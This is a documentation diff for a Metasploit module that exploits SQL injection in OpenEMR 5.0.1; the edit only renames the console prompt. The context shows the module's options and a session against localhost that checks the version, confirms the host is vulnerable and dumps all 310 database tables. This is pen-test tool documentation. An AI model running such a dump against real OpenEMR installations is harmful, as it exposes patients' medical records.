@@ -13,7 +13,7 @@ OpenEMR 5.0.1 (3).
 ## Options
 
 ```
-msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > show options
+msf auxiliary(sqli/openemr/openemr_sqli_dump) > show options
 
 Module options (auxiliary/sqli/openemr/openemr_sqli_dump):
 
@@ -32,14 +32,14 @@ Module options (auxiliary/sqli/openemr/openemr_sqli_dump):
 This module has both `check` and `run` functions.
 
 ```
-msf5 > use auxiliary/sqli/openemr/openemr_sqli_dump
-msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > set rhosts 127.0.0.1
+msf > use auxiliary/sqli/openemr/openemr_sqli_dump
+msf auxiliary(sqli/openemr/openemr_sqli_dump) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > check
+msf auxiliary(sqli/openemr/openemr_sqli_dump) > check
 
 [*] Trying to detect installed version
 [*] 127.0.0.1:80 - The target appears to be vulnerable.
-msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > run
+msf auxiliary(sqli/openemr/openemr_sqli_dump) > run
 [*] Running module against 127.0.0.1
 
 [*] DB Version: 10.3.15-MariaDB-1
@@ -61,7 +61,7 @@ msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > run
 [*] Dumping table (310/310): geo_country_reference
 [*] Dumped all tables to /root/.msf4/loot
 [*] Auxiliary module execution completed
-msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > exit
+msf auxiliary(sqli/openemr/openemr_sqli_dump) > exit
 
 root@localhost:/# cd /root/.msf4/loot
 root@localhost:~/.msf4/loot# ls -l
